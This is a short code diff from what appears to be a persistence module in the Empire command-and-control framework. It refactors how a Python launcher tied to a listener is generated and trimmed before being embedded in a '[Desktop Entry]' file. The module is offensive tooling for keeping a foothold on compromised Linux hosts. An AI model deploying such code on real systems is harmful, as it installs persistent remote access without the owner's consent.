@@ -1,6 +1,5 @@
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.string_util import removeprefix, removesuffix
 
 
 class Module:
@@ -15,9 +14,11 @@ class Module:
         remove = params["Remove"]
         file_name = params["FileName"]
         listener_name = params["Listener"]
-        launcher = main_menu.stagers.generate_launcher(listener_name, language="python")
-        launcher = removeprefix(launcher, "echo ")
-        launcher = removesuffix(launcher, " | python3 &")
+        launcher = main_menu.stagergenv2.generate_launcher(
+            listener_name, language="python"
+        )
+        launcher = launcher.removeprefix("echo ")
+        launcher = launcher.removesuffix(" | python3 &")
         dt_settings = f"""
 [Desktop Entry]
 Name={file_name}
